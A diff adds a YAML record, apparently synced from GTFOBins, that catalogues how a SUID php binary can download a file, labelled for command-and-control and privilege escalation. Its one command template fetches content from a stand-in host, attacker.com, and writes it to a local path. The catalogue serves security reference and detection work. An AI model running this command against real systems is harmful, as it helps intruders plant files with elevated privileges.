@@ -1,0 +1,25 @@
+id: gtfobins/php/download/suid
+type: binary
+platform: linux
+name: php
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file",
+    $c);'
+references:
+- https://gtfobins.github.io/gtfobins/php/
+tags:
+- linux
+- unix
+- gtfobins
